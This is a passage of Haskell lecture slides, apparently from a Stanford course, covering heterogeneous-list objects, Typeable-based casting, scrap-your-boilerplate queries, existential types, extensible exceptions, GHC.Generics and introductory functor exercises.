          (.!) ((_, v) :*: _) _ = v
      instance (Select k h v) => Select k (kv' :*: h) v where
          (.!) (kv' :*: h) k = h .! k

   ::

      *Main> foo .! A
      "Hello"

-  Once again, note the importance of ``OverlappingInstances``

   -  Needed to break recursion when type of lookup tag matches head of
      list

-  Can use to implement all sorts of other features (concatenation,
   etc.)

Object-oriented programming
===========================

-  Heterogeneous can implement object-oriented programming!

   .. code:: haskell

      returnIO :: a -> IO a
      returnIO = return

      data GetVal = GetVal deriving Show
      data SetVal = SetVal deriving Show
      data ClearVal = ClearVal deriving Show

      mkVal n self = do
        val <- newIORef (n :: Int)
        returnIO $ (GetVal, readIORef val)
                 :*: (SetVal, writeIORef val)
                 :*: (ClearVal, self .! SetVal $ 0)
                 :*: HNil

      test = do               -- prints 7, then 0
        x <- mfix $ mkVal 7
        x .! GetVal >>= print
        x .! ClearVal
        x .! GetVal >>= print

-  But why ``mfix``?

‚ÄúTying the recursive knot‚Äù
==========================

-  ``mfix`` allows you to override methods with inheritance

   -  Example, create a ‚Äúconst val‚Äù that ignores ``SetVal`` messages

   .. code:: haskell

      mkConstVal n self = do
        super <- mkVal n self
        returnIO $ (SetVal, const $ return ())
                 :*: super

      test2 = do
        x <- mfix $ mkConstVal 7
        x .! GetVal >>= print
        x .! ClearVal
        x .! GetVal >>= print

   ::

      *Main> test
      7
      0
      *Main> test2
      7
      7   

-  ``mkVal`` ‚Äôs call to ``SetVal`` was properly overridden by
   ``mkConstVal``


/L8 Generic programming
=========================

Coverting tuples to lists
=========================

-  Let‚Äôs say you wanted to convert pairs to lists of ``Strings``

   .. code:: haskell

      pairToStringList :: (Show a, Show b) => (a, b) -> [String]
      pairToStringList (a, b) = [show a, show b]

   ::

      *Main> pairToStringList (True, Just 3)
      ["True","Just 3"]

-  Now say you want to convert a pair of ``Enum`` s to a list of
   ``Int`` s

   .. code:: haskell

      pairToIntList :: (Enum a, Enum b) => (a, b) -> [Int]
      pairToIntList (a, b) = [fromEnum a, fromEnum b]

-  Can we generalize this function? Would like to say:

   .. code:: haskell

      pairToList conv (a, b) = [conv a, conv b]
      pairToList show (True, Just 3)   -- error

   -  Unfortunately, can‚Äôt pass *methods* as arguments, only *functions*

      .. code:: haskell

         pairToList :: (a -> b) -> (a, a) -> [b]

Polymorphism with fundeps
=========================

-  Let‚Äôs represent ad hoc polymorphic methods with a *class*

   .. code:: haskell

      {-# LANGUAGE MultiParamTypeClasses #-}
      {-# LANGUAGE FunctionalDependencies #-}
      {-# LANGUAGE FlexibleInstances #-}

      class Function f a b | f a -> b where
          funcall :: f -> a -> b
      instance Function (a -> b) a b where
          funcall = id

      pairToList :: (Function f a c, Function f b c) =>
                    f -> (a, b) -> [c]
      pairToList f (a, b) = [funcall f a, funcall f b]

-  Use placeholder singleton types to represent particular methods

   .. code:: haskell

      data ShowF = ShowF
      instance (Show a) => Function ShowF a [Char] where
          funcall _ = show

      data FromEnumF = FromEnumF
      instance (Enum a) => Function FromEnumF a Int where
          funcall _ = fromEnum

``Function`` in action
======================

-  Now singleton types act like method arguments:

   .. code:: haskell

      *Main> pairToList ShowF (True, 3)
      ["True","3"]
      *Main> pairToList FromEnumF (False, 7)
      [0,7]

-  Now, what if you wanted ``tupleToList`` for arbitrary
   :math:`n`-tuples?

   -  Can auto-generate instances for a generic tuple fold, e.g.:

   .. code:: haskell

      class TupleFoldr f z t r | f z t -> r where
          tupleFoldr :: f -> z -> t -> r

   -  Works okay for small tuples, craps out around 10-tuple without
      larger ``-fcontext-stack`` argument

-  Unfortunately, I‚Äôm temporarily out of compile-time tricks

   -  An alternative is to use run-time type information (RTTI)
   -  RTTI easier to reason about, but adds runtime overhead and errors
   -  We will come back to static tricks at end of lecture

DeriveDataTypeable extension
============================

-  Haskell allows six classes to be automatically derived

   -  ``Show``, ``Read``, ``Eq``, ``Ord``, ``Bounded``, ``Enum``

-  ```DeriveDataTypeable`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/deriving.html#deriving-typeable>`__
   extension adds two more: ``Typeable``, ``Data``

   .. code:: haskell

      data MyType = Con1 Int | Con2 String deriving (Typeable, Data)

   -  These types encode run-time type information in various ways
   -  ``Data`` requires that inner types (``Int``, ``String``) also have
      instances
   -  ``Typeable`` requires any type parameters to have instances

   .. code:: haskell

      -- MyTyCon only typeable when a is
      data MyTyCon a = MyTyCon a deriving (Typeable, Data)

   -  Most standard library types have ``Typeable`` and ``Data``
      instances

-  Provide programming approach known as ‚Äúscrap your boilerplate‚Äù

   -  GHC‚Äôs support described by two papers:
      `[Boilerplate1] <http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps>`__,
      `[Boilerplate2] <http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/gmap2.ps>`__

The ```Typeable`` class
=======================

http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Typeable.html#t:Typeable

-  ``import Data.Typeable`` to get ``Typeable`` class:

   .. code:: haskell

      class Typeable a where
          typeOf :: a -> TypeRep -- Note: never evaluates argument

      data TypeRep -- Opaque, but instance of Eq, Ord, Show, Typeable

-  This allows us to compare types for equality

   .. code:: haskell

      rtTypeEq :: (Typeable a, Typeable b) => a -> b -> Bool
      rtTypeEq a b = typeOf a == typeOf b

   ::

      *Main> rtTypeEq True False
      True
      *Main> rtTypeEq True 5
      False

-  Big Whoop!

   -  Couldn‚Äôt we already do this at compile time with
      ``OverlappingInstances``?
   -  Doing it dynamically is less exciting, but different
   -  And allows one very important function‚Ä¶

Type Casting
============

-  GHC has a function
   ```unsafeCoerce`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Unsafe-Coerce.html#v:unsafeCoerce>`__

   .. code:: haskell

      unsafeCoerce :: a -> b

   -  And note: it doesn‚Äôt just return :math:`\bot`
   -  If the name doesn‚Äôt scare you, the type signature should

-  Let‚Äôs use ``Typeable`` to make a safe ``cast`` function

   .. code:: haskell

      cast :: (Typeable a, Typeable b) => a -> Maybe b
      cast a = fix $  ~(Just b) -> if typeOf a == typeOf b
                                    then Just $ unsafeCoerce a
                                    else Nothing

   ::

      *Main> cast "hello" :: Maybe String
      Just "hello"
      *Main> cast "hello" :: Maybe Int
      Nothing

   -  Safe if ``typeOf`` on two different types always returns different
      ``TypeRep`` s
   -  Guaranteed by ``deriving (Typeable)``; SafeHaskell disallows
      manual instances

Generalized casting
===================

-  To cast monadic computations, etc., use generalized cast, ``gcast``:

   .. code:: haskell

      import Data.Maybe (fromJust)

      gcast :: (Typeable a, Typeable b) => c a -> Maybe (c b)
      gcast ca = mcr
        where mcr = if typeOf (unc ca) == typeOf (unc $ fromJust mcr)
                    then Just $ unsafeCoerce ca
                    else Nothing
              unc :: c x -> x
              unc = undefined

   ::

      *Main> fromJust $ gcast (readFile "/etc/issue") :: IO String
      "\nArch Linux \\r  (\\n) (\\l)\n\n"
      *Main> fromJust $ gcast (readFile "/etc/issue") :: IO Int
      *** Exception: Maybe.fromJust: Nothing

-  Note undefined function ``unc`` in definition of ``gcast``

   -  Common idiom‚Äìposes no problem because ``typeOf`` is not strict
   -  Recall context ``Typeable b =>`` is like a hidden argument; often
      use undefined functions with type signatures to unpack types and
      get dictionaries

Using ``Typeable``: ``mkT`` ``[Boilerplate1]``
==============================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps

-  ``mkT`` (‚Äúmake transformation‚Äù) behaves like ``id`` except on one
   type

   .. code:: haskell

      mkT :: (Typeable a, Typeable b) => (b -> b) -> a -> a

-  Example:

   .. code:: haskell

      newtype Salary = Salary Double deriving (Show, Data, Typeable)

      raiseSalary :: (Typeable a) => a -> a
      raiseSalary = mkT $ \(Salary s) -> Salary (s * 1.04)

   ::

      *Main> raiseSalary ()
      ()
      *Main> raiseSalary 7
      7
      *Main> raiseSalary (Salary 7)
      Salary 7.28

-  Exercise: implement ``mkT``

   -  Hint: The function type ``(->)`` is ``Typeable``, so
      ``Data.Typeable`` exports:

   .. code:: haskell

      instance (Typeable a, Typeable b) => Typeable (a -> b) where ...

Solution
========

.. code:: haskell

   mkT :: (Typeable a, Typeable b) => (b -> b) -> a -> a
   mkT f a = case cast f of Just g  -> g a
                            Nothing -> a

-  Note the magic of Haskell‚Äôs type inference

   -  ``g`` is applied to ``a``, so must have type ``a -> a``
   -  Hence ``cast f`` must have type ``Maybe (a -> a)``
   -  Hence compiler knows to use ``Typeable`` dictionary of
      ``(b -> b)`` for argument, and dictionary ``(a -> a)`` for return
      of ``cast``

-  `[Jones] <http://web.cecs.pdx.edu/~mpj/thih/>`__ has detailed
   explanation of Haskell‚Äôs type inference

-  Note, a fancier implementation could use standard ``maybe`` function

   .. code:: haskell

      maybe :: b -> (a -> b) -> Maybe a -> b
      maybe b _ Nothing  = b
      maybe _ f (Just a) = f a

   .. code:: haskell

      mkT :: (Typeable a, Typeable b) => (b -> b) -> (a -> a)
      mkT f = maybe id id $ cast f

Using ``Typeable``: ``mkQ`` ``[Boilerplate1]``
==============================================

http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps

-  Function that computes over one type or returns default val:

   .. code:: haskell

      mkQ :: (Typeable a, Typeable b) => r -> (b -> r) -> a -> r
      mkQ defaultVal fn a = ...

   -  ``mkQ`` stands for ‚Äúmake query‚Äù

-  Example

   .. code:: haskell

      salaryVal :: Typeable a => a -> Double
      salaryVal = mkQ 0 $ \(Salary s) -> s

   ::

      *Main> salaryVal ()
      0.0
      *Main> salaryVal 7
      0.0
      *Main> salaryVal (Salary 7)
      7.0

-  Exercise: implement ``mkQ``

.. _solution-1:

Solution
========

.. code:: haskell

   mkQ :: (Typeable a, Typeable b) => r -> (b -> r) -> a -> r
   mkQ defaultVal fn a = case cast a of
                           Just b -> fn b
                           Nothing -> defaultVal

-  Or if you want to get fancy:

.. code:: haskell

   mkQ :: (Typeable a, Typeable b) => r -> (b -> r) -> a -> r
   mkQ defaultVal fn = maybe defaultVal fn . cast

Functions on multiple types: ``extQ``
=====================================

-  ``mkQ`` only works for one type

   -  Let‚Äôs extend ``mkQ`` ‚Äôs output to work on another type
      `[Boilerplate1] <http://research.microsoft.com/en-us/um/people/simonpj/papers/hmap/hmap.ps>`__

   .. code:: haskell

      extQ :: (Typeable a, Typeable b) =>
              (a -> r) -> (b -> r) -> a -> r
      extQ q f a = case cast a of
                     Just b -> f b
                     Nothing -> q a

-  Now can cascade multiple one-type query functions

   .. code:: haskell

      myShow :: Typeable a => a -> String
      myShow = mkQ "unknown type" (show :: Int -> String)
               `extQ` (show :: Bool -> String)
               `extQ` (show :: Integer -> String)
               `extQ` (const "no floating point" :: Double -> String)

   -  Recall default associatifity is left
      (:literal:`infixl 9 \`extQ\``)
   -  Kind of tedious, but could approximate goal of ``tupleToList`` at
      beginning of lecture if tuples contain limited number of types

```ExistentialQuantification`` extension
========================================

http://www.haskell.org/ghc/docs/latest/html/users_guide/data-type-extensions.html#existential-quantification

-  Lets you introduce type variables on right side of ``data``
   declaration

   .. code:: haskell

      {-# LANGUAGE ExistentialQuantification #-}
      data Step s a = Done | Skip !s | Yield !a !s
      data Stream a = forall s. Stream (s -> Step s a) !s                

   -  Given a value of type ``Stream a``, there exists a type ``s`` such
      that‚Ä¶ But syntax uses ``forall``, not ``exists``, to avoid
      introducing new keyword
   -  Very safe extension (``Control.Exception`` relies on it)

-  Don‚Äôt confuse with
   ```Rank2Types`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/other-type-extensions.html#universal-quantification>`__,
   where ``forall`` means for all types ``s``:

   .. code:: haskell

      data Stream a = Stream (forall s. s -> Step s a)

-  Contexts on existential variables like hidden dictionary fields

   .. code:: haskell

      data Showable = forall a. (Show a) => Showable a
      instance Show Showable where
          show (Showable a) = "Showable " ++ show a

   -  A ``Showable`` value has both a value of type ``a``, and a
      dictionary for ``Show``

Example: Dynamic type
=====================

-  ```Data.Dynamic`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Dynamic.html>`__
   has type ``Dynamic``, which can hold anything ``Typeable``

   .. code:: haskell

      data Dynamic  -- opaque type
      toDyn :: Typeable a => a -> Dynamic
      fromDynamic :: Typeable a => Dynamic -> Maybe a

-  Actual implementation slightly gross

   -  Uses ``unsafeCoerce`` to coerce everything to a placeholder
      ``Obj`` type

-  But easy to implement safely with ``ExistentialQuantification``:

   .. code:: haskell

      data Dynamic = forall a. Typeable a => Dynamic a

      toDyn :: Typeable a => a -> Dynamic
      toDyn = Dynamic

      fromDynamic :: Typeable a => Dynamic -> Maybe a
      fromDynamic (Dynamic a) = cast a

Example: Extensible exceptions `[Marlow]`
=========================================

http://community.haskell.org/~simonmar/papers/ext-exceptions.pdf

-  GHC runtime implements primitive, unsafe exceptions

   .. code:: haskell

      raise# :: a -> b
      catch# :: IO a -> (b -> IO a) -> IO a  -- slight simplification

   -  Must ensure that, as used, ``b`` is always same type, otherwise
      get unsafe coercion

-  In reality, want many exception types, organized into a hierarchy

-  ```Control.Exception`` <http://hackage.haskell.org/packages/archive/base/latest/doc/html/Control-Exception.html>`__
   implements safe, hierarchical exceptions

   -  ``raise#`` and ``catch#`` only ever called with one type:
      ``SomeException``

   .. code:: haskell

      class (Typeable e, Show e) => Exception e where
          toException :: e -> SomeException
          toException = SomeException                 -- default impl
          fromException :: SomeException -> Maybe e
          fromException (SomeException e) = cast e    -- default impl

      data SomeException = forall e. Exception e => SomeException e
          deriving Typeable  -- note use of ExistentialQuantification
      instance Show SomeException where
          show (SomeException e) = show e

Throwing and catching exceptions
================================

.. code:: haskell

   class (Typeable e, Show e) => Exception e where
       toException :: e -> SomeException
       fromException :: SomeException -> Maybe e

-  To throw an exception, first convert it to type ``SomeException``

   .. code:: haskell

      throw :: Exception e => e -> a
      throw e = raise# (toException e)

-  To catch an exception, must ensure it matches desired type

   .. code:: haskell

      -- Define catchX because catch#'s real type more complicated
      catchX :: IO a -> (b -> IO a) -> IO a
      catchX (IO a) handler = IO $ catch# a (unIO . handler)

      catch :: (Exception e) => IO a -> (e -> IO a) -> IO a
      catch action handler = catchX action handler'
          where handler' se =
                  maybe (throwIO se) handler $ fromException se

   -  Note ``handler`` makes ``fromException se`` use ``e`` ‚Äôs
      ``Exception`` dictionary

Making hierarchical exceptions
==============================

-  Easy to add your own top-level exception type

   .. code:: haskell

      data MyException = MyException deriving (Show, Typeable)
      instance Exception MyException -- use default methods

-  But you can also create a hierarchy of exception types

   .. code:: haskell

      data AppError = forall e. Exception e => AppError e
                      deriving (Typeable)
      instance Show AppError where show (AppError e) = show e
      instance Exception AppError

      data Error1 = Error1 deriving (Show, Typeable)
      instance Exception Error1 where
          toException = toException . AppError
          fromException se = do  -- using Maybe as a Monad here
            AppError e <- fromException se
            cast e

      -- Now can do the same for Error2, and catch both as AppError

   -  Let‚Äôs you catch just ``Error1``, or any ``AppError``

The ```Data`` class
===================

http://hackage.haskell.org/packages/archive/base/latest/doc/html/Data-Data.html#t:Data

.. code:: haskell

   class Typeable a => Data a where ...

-  ``Data`` class allows generic traversal and construction of data
   structures

   -  Defines ``gfoldl`` and ``gunfold`` methods like this

   .. code:: haskell

      data T a b = C1 a b | C2 deriving (Typeable, Data)

      gfoldl k z (C1 a b) = z C1 `k` a `k` b
      gfoldl k z C2       = z C2

      toConstr (C1 _ _) = ...     -- encodes constructor number
      toConstr C2       = ...
      gunfold k z c = case constrIndex c of
                          1 -> k (k (z C1))
                          2 -> z C2

-  Now can work over all sized tuples! But:

   -  Once you introduce types, things get uglier [cosmetic]
   -  The only dictionaries available are ``Data`` and ``Typeable``
      [fundamental]
   -  All the runtime type checking is slow [fundamental]

.. raw:: html

   <!--

   # The [`Data`] class

   ~~~~ {.haskell}
   class Typeable a => Data a where ...
   ~~~~

   * In addition to `Typeable`, can also derive `Data`
       * Allows generic traversal and construction of data structures
       * We will build it up one method at a time, using the following example

       ~~~~ {.haskell}
       import Data.Data

       data T a b = C1 a b | C2 deriving (Typeable, Data)
       ~~~~

   * `deriving Data` will cause this `gfoldl` method to be defined

       ~~~~ {.haskell}
       gfoldl k z (C1 a b) = z C1 `k` a `k` b
       gfoldl k z C2       = z C2
       ~~~~

       * This allows us to implement functions working over all sized tuples
   * Two limitations:
       1. Once you introduce types, things get uglier [cosmetic]
       2. The only dictionaries available are `Data` and `Typeable` [fundamental]

   # `gfoldl` traversals

   * The actual type of `gfoldl`:

       ~~~~ {.haskell}
       -- Recall:  gfoldl k z (C1 a b) = ((z C1) `k` a) `k` b

       gfoldl  :: (forall d b. Data d => c (d -> b) -> d -> c b)  -- k
               -> (forall g. g -> c g)                            -- z
               -> a
               -> c a
       ~~~~

   * If you ignore the `c` parameter, looks like re-applying constructor
       * E.g., call `gfoldl ($) id x`, where `b` type of partially
          applied constructor
       * Can wrap `Identity` monad (applicative functor) around values to
         ignore `c`

       ~~~~ {.haskell}
       raiseSalaries :: (Data x) => x -> x
       raiseSalaries x = runIdentity $ gfoldl step return (raiseSalary x)
           where step cdb d = cdb <*> (pure $ raiseSalaries d)
       ~~~~

       * Function only bumps salaries, leaves other data fields alone

       ~~~~
       *Main> raiseSalaries $ Just (1, Salary 4, True, (Salary 7, ()))
       Just (1,Salary 4.16,True,(Salary 7.28,()))
       ~~~~

   # `gfoldl` queries

   * Can use a different type `c` to ignore constructor/arg types

       ~~~~ {.haskell}
       newtype Q r a = Q { unQ :: r }

       qappend :: (Monoid r) => Q r a -> Q r b -> Q r c
       qappend (Q r1) (Q r2) = Q $ mappend r1 r2
       ~~~~

       * Notice we completely ignore second type argument (`a`)
   * Now say we want to sum all salaries in a structure

       ~~~~ {.haskell}
       sumSalaries :: (Data x) => x -> Double
       sumSalaries x = getSum $ unQ $ gfoldl step (\_ -> toQ x) x
           where step tot d = tot `qappend` (Q $ Sum $ sumSalaries d)
                 toQ = mkQ (Q $ Sum 0) $ \(Salary s) -> Q $ Sum s
       ~~~~

       ~~~~
       *Main> sumSalaries (Salary 7, Salary 9, True, Just (Salary 4))
       20.0
       ~~~~

   # Unfolding [[Boilerplate2]]

   * We've seen how to traverse, modify, and reduce data structures
       * Could, for instance, use `gfoldl` to serialize a data structure
       * What about unserializing a data structure?
   * `Data` contains two more useful methods

       * Again, assume example type

       ~~~~ {.haskell}
       data T a b = C1 a b | C2 deriving (Typeable, Data)
       ~~~~

       * And `Data` will contain the following methods for `T`:

       ~~~~ {.haskell}
       toConstr (C1 _ _) = ...     -- encodes constructor number
       toConstr C2       = ...

       gunfold k z c = case constrIndex c of
                           1 -> k (k (z C1))
                           2 -> z C2
       ~~~~

       * This is the dual of `gfoldl`--instead of supplying the values to
         `k`, now `k` has a chance to feed values to the constructor

   # Type of `gunfold`

   ~~~~ {.haskell}
   class (Typeable a) => Data a where
       dataTypeOf :: a -> DataType -- non-strict, return has [Constr]
       toConstr :: a -> Constr
       gunfold :: (forall b r. Data b => c (b -> r) -> c r)
               -> (forall r. r -> c r)
               -> Constr
               -> c a

   dataTypeConstrs :: DataType -> [Constr]
   indexConstr :: DataType -> Int -> Constr
   maxConstrIndex :: DataType -> Int
   ~~~~

   * Now you can use `cast` to produce values to feed into constructor
   * Can use to implement generic read/unmarshal functions
       * See examples in [[Boilerplate2]] paper

   -->

Can we do it at compile time?
=============================

-  Alternative: push generic programming to compile time
   `[Magalh√£es] <http://dreixel.net/research/pdf/gdmh.pdf>`__

-  Let‚Äôs look at a simplified implementation

   -  ``wget``
      ```cs240h.stanford.edu/metadata.hs`` <http://www.scs.stanford.edu/14sp-cs240h/metadata.hs>`__

-  High-level idea: Say you auto-derived instances of ``Show``-like
   class:

   .. code:: haskell

      class MyShow a where myShow :: a -> String

      instance MyShow MyType where myShow = genericMyShow

   -  Introduce generic ``MetaData`` class for which compiler can
      generate instance

   .. code:: haskell

      class MetaData d m | d -> m, m -> d where -- not what GHC does
        fromData :: d -> m
        toData :: m -> d

   -  And a ``MyShow``-specific meta-class, such that?

   .. code:: haskell

      class MetaMyShow a where metaMyShow :: a -> String
      genericMyShow :: (MetaData d m, MetaMyShow m) => d -> String
      genericMyShow = metaMyShow . fromData

```DefaultSignatures`` extension
================================

-  We can do even better using
   ```DefaultSignatures`` <http://www.haskell.org/ghc/docs/latest/html/users_guide/type-class-extensions.html#class-default-signatures>`__
   extension

-  Allows default methods that don‚Äôt work for all instances

.. code:: haskell

   {-# LANGUAGE DefaultSignatures #-}

   class MyShow a where
     myShow :: a -> String
     default myShow :: (MetaData a m, MetaMyShow m) => a -> String
     myShow = genericMyShow

-  Makes it even easier to declare instances

.. code:: haskell

   instance MyShow MyType

-  Let‚Äôs see how we could design such a ``MetaData`` class

   -  ``wget``
      ```cs240h.stanford.edu/metadata.hs`` <http://www.scs.stanford.edu/14sp-cs240h/metadata.hs>`__

```DeriveGeneric`` extension
============================

http://www.haskell.org/ghc/docs/latest/html/users_guide/generic-programming.html

-  Compiler supports single ``Generic`` class that converts any datatype
   to a ``Rep`` that can be computed over generically:

   .. code:: haskell

      {-# LANGUAGE TypeFamilies #-}

      class Generic a where
        type Rep a :: * -> *
        from :: a -> Rep a x
        to :: Rep a x -> a

-  ``type Rep`` uses extension called ``TypeFamilies``. Can read above
   as:

   .. code:: haskell

      class Generic a rep | a -> rep where
          from :: a -> rep x
          to :: rep x -> a

-  Like our simpler example, except everything of kind ‚àó ‚Üí ‚àó

   -  Why? Maybe so you need a Ph.D. to use the extension?
   -  (Allegedly will someday facilitate generic types of kind ‚àó ‚Üí ‚àó, so
      can make generic ``Functor``-like instances)

``Rep`` of a unit type
======================

.. code:: haskell

   {-# LANGUAGE DeriveGeneric, TypeFamilies, TypeOperators,
       FlexibleInstances, FlexibleContexts, UndecidableInstances #-}

   import GHC.Generics

   data X = X  -- because we are dealing with types of kind * -> *
   undef2 :: mi c f p -> f p
   undef2 _ = undefined

   -- A unit type has one constructor and no arguments
   data T1 = C1 deriving (Show, Generic)

::

   *Main> :t from C1
   from C1 :: Rep T1 x
   *Main> :t (undefined :: Rep T1 X)
   (undefined :: Rep T1 X) :: D1 Main.D1T1 (C1 Main.C1_0T1 U1) X
   *Main> datatypeName (from C1)
   "T1"
   *Main> moduleName (from C1)
   "Main"
   *Main> conName $ undef2 (from C1)
   "C1"

```GHC.Generics`` contents (part 1)
===================================

http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/GHC-Generics.html

.. code:: haskell

   {-# LANGUAGE TypeFamilies, KindSignatures, TypeOperators #-}

   -- | Unit: used for constructors without arguments
   data U1 p = U1

   -- | Meta-information (constructor names, etc.)
   newtype M1 i c f p = M1 { unM1 :: f p }

   -- | Three flavors of meta-information for variable i
   data D; type D1 = M1 D -- c instance of Datatype, f is C1 (or :+:)
   data C; type C1 = M1 C -- c instance of Constructor, f is S1 (or :*:)
   data S; type S1 = M1 S -- c instance of Selector, f is U1 (or Rec0)

   class Datatype d where
     datatypeName :: t d (f :: * -> *) a -> String
     moduleName   :: t d (f :: * -> *) a -> String
   class Constructor c where
     conName :: t c (f :: * -> *) a -> String
   class Selector s where
     selName :: t s (f :: * -> *) a -> String

Types with constructor arguments
================================

.. code:: haskell

   data T2 = C2 { t2a :: Bool } deriving (Show, Generic)
   data T3 = C3 { t3a :: Bool, t3b :: Bool } deriving (Show, Generic)

::

   *Main> :t (undefined :: Rep T2 X)
   (undefined :: Rep T2 X)
     :: D1 Main.D1T2 (C1 Main.C1_0T2 (S1 Main.S1_0_0T2 (Rec0 Bool))) X
   *Main> -- This was U1 for type T1 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   *Main> conName (undef2 $ from $ C2 True)
   "C2"
   *Main> selName (undef2 $ undef2 $ from $ C2 True)
   "t2a"
   *Main> :t (undefined :: Rep T3 X)
   (undefined :: Rep T3 X)
     :: D1
          Main.D1T3
          (C1
             Main.C1_0T3
             (S1 Main.S1_0_0T3 (Rec0 Bool) :*: S1 Main.S1_0_1T3 (Rec0 Bool)))
          X

-  Note selectors are one feature our simpler example didn‚Äôt have

   -  Let‚Äôs you pick out record names from types

```GHC.Generics`` contents (part 2)
===================================

http://www.haskell.org/ghc/docs/latest/html/libraries/base-4.7.0.0/GHC-Generics.html

.. code:: haskell

   -- Used to glue multiple constructor arguments together
   data (:*:) f g p = f p :*: g p
   infixr 6 :*:

   -- Used to represent a type with multiple constructors
   data (:+:) f g p = L1 { unL1 :: f p } | R1 { unR1 :: g p }
   infixr 5 :+:

   -- Used to hold actual concrete values of constructor arguments
   newtype K1 i c p = K1 { unK1 :: c }
   type Rec0 = K1 R

   -- From two slides ago:
   data U1 p = U1 -- Unit constructors (no arguments)
   newtype M1 i c f p = M1 { unM1 :: f p }
   data D; type D1 = M1 D -- c instance of Datatype, f is C1 or :+:
   data C; type C1 = M1 C -- c instance of Constructor, f is S1 or :*:
   data S; type S1 = M1 S -- c instance of Selector, f is U1 or Rec0

-  Again, ignore parameter ``p`` (there to make types of kind ‚àó ‚Üí ‚àó)
-  ``M1`` exists so a single traversal method can skip over ``D1``,
   ``C1``, and ``S1``
-  Could say ``newtype Rec0 c p = K1 c``, but some instances use
   ``K1 P``

What would a ``Generic`` instance look like?
============================================

.. code:: haskell

   data T a b = C1 a b | C2 deriving (Show, Generic)

   data T_
   instance Datatype T_ where
       datatypeName _ = "T"
       moduleName _ = "Main"

   data T_C1_
   data T_C2_
   instance Constructor T_C1_ where conName _ = "C1"
   instance Constructor T_C2_ where conName _ = "C2"

   type Rep0T_ a_0 b_1 = D1 T_
     (C1 T_C1_ (S1 NoSelector (Rec0 a_0) :*: S1 NoSelector (Rec0 b_1))
      :+: (C1 T_C2_ U1))

   instance Generic (T a_0 b_1) where
       type Rep (T a_0 b_1) = Rep0T_ a_0 b_1
       from (C1 f0 f1) = M1 (L1 (M1 (M1 (K1 f0) :*: M1 (K1 f1))))
       from (C2)       = M1 (R1 (M1 U1))
       to (M1 (L1 (M1 (M1 (K1 f0) :*: M1 (K1 f1))))) = C1 f0 f1
       to (M1 (R1 (M1 U1)))                          = C2

How can we use this?
====================

-  Say we are defining our own ``Show``-like class

   .. code:: haskell

      class MyShow a where myShow :: a -> String
      instance MyShow [Char] where myShow = show
      instance MyShow Int where myShow = show

-  Want it to work with all user-defined data types

   -  Let‚Äôs define a class ``Show1`` to deal with annoying ``p``
      parameters

   .. code:: haskell

      {-# LANGUAGE FlexibleInstances, UndecidableInstances,
        OverlappingInstances, TypeSynonymInstances, TypeOperators,
        TypeFamilies, TemplateHaskell, FlexibleContexts #-}

      class MyShow1 f where myShow1 :: f p -> String

   -  And let‚Äôs define generic traversal methods

   .. code:: haskell

      instance (MyShow1 f) => MyShow1 (M1 i c f) where  -- for D1, S1
          myShow1 m1 = myShow1 (unM1 m1)
      instance (MyShow1 f, MyShow1 g) => MyShow1 (f :+: g) where
          myShow1 (L1 a) = myShow1 a
          myShow1 (R1 a) = myShow1 a

Non-generic instances of ``MyShow1``
====================================

-  When we hit a constructor, want to print the name

   .. code:: haskell

      instance (Constructor c, MyShow1 f) => MyShow1 (C1 c f) where
          myShow1 m1 = conName m1 ++ myShow1 (unM1 m1)

   -  We‚Äôre using OverlappingInstances, since already have ``M1``
      instance

-  When we have no constructor args, don‚Äôt show anything

   .. code:: haskell

      instance MyShow1 U1 where myShow1 _ = ""

-  When we have multiple constructor args, show them all

   .. code:: haskell

      instance (MyShow1 f, MyShow1 g) => MyShow1 (f :*: g) where
          myShow1 (fp :*: gp) = myShow1 fp ++ myShow1 gp

-  When you hit the actual value, show it

   .. code:: haskell

      instance (MyShow c) => MyShow1 (K1 i c) where
          myShow1 k1 = ' ' : myShow (unK1 k1)

   -  Now we‚Äôre calling ``myShow``, which we haven‚Äôt yet defined for
      many types

Implementing a generic ``MyShow``
=================================

-  Now can define generic ``MyShow`` in terms of ``MyShow1``

   .. code:: haskell

      instance (Generic a, MyShow1 (Rep a)) => MyShow a where
          myShow a = myShow1 $ from a

-  Can we avoid ``OverlappingInstances``?

   -  Could have defined separate ``D1``, ``S1`` instances of ``Show1``
      (easy)
   -  Could have avoided completely generic instance Recommended use is
      just to define a *function* ``myShowDefault``, then

   .. code:: haskell

      myShowDefault :: (Generic a, MyShow1 (Rep a)) => a -> String
      myShowDefault a = myShow1 $ from a

      instance MyShow T1 where myShow = myShowDefault
      instance MyShow T2 where myShow = myShowDefault
      instance MyShow T3 where myShow = myShowDefault
      ...

   -  There‚Äôs still the problem of different behavior for ``[Char]``
      vs. ``[a]``


/L9 Monads and more
===================

In our lecture on testing, we visited with the humble functor.

.. code:: haskell

   class Functor f where
       fmap :: (a -> b) -> f a -> f b

But how good is our intuition for what a functor is? 

Functors over lists
===================

Please tell me what the following computes: 

.. code:: haskell

   fmap (+1) [1,2,3]

.. _functors-over-lists-1:

Functors over lists
===================

Please tell me what the following computes: 

.. code:: haskell

   import Data.Char
   fmap toUpper "qwertyuiop"

Functors over Maybe
===================

Let‚Äôs avoid name clash with the standard ``Functor`` class:

.. code:: haskell

   class MyFunctor f where
       myfmap :: (a -> b) -> f a -> f b

Please write a ``MyFunctor`` instance for ``Maybe``.

You have 2 minutes.

.. _functors-over-maybe-1:

Functors over Maybe
===================

Let‚Äôs avoid name clash with the standard ``Functor`` class:

.. code:: haskell

   class MyFunctor f where
       myfmap :: (a -> b) -> f a -> f b

Here is a ``MyFunctor`` instance for ``Maybe``.

.. code:: haskell

   instance MyFunctor Maybe where
       myfmap _ Nothing  = Nothing
       myfmap f (Just a) = Just (f a)

Functors over Identity
======================

Please dictate to me a ``MyFunctor`` instance for ``Identity``.

.. code:: haskell

   newtype Identity a = Identity a

(You can find this type in ``Data.Functor.Identity``.)

One view of functors
====================

Suppose we think of a functor as a container.

What do we know about what a functor does to the things inside the
container?

How about the structure of the container itself? 

Constructing a tuple
====================

